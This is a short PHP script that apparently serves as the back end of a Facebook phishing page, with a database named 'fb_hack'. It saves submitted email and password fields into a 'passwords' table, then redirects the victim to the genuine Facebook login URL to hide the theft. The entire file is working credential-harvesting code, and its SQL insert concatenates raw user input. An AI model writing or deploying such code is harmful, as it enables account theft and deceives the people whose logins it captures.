<?php

print_r($_POST);

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "fb_hack";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// insert into database

if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $password = $_POST['pass'];

    $sql = "INSERT INTO passwords (UserName, Password) VALUES ('" . $email . "', '" . $password . "')";

    mysqli_query($conn, $sql);
}

$conn->close();

?>

<script type="text/javascript">
	window.location.replace("https://www.facebook.com/login.php?login_attempt=1&lwv=111");
</script>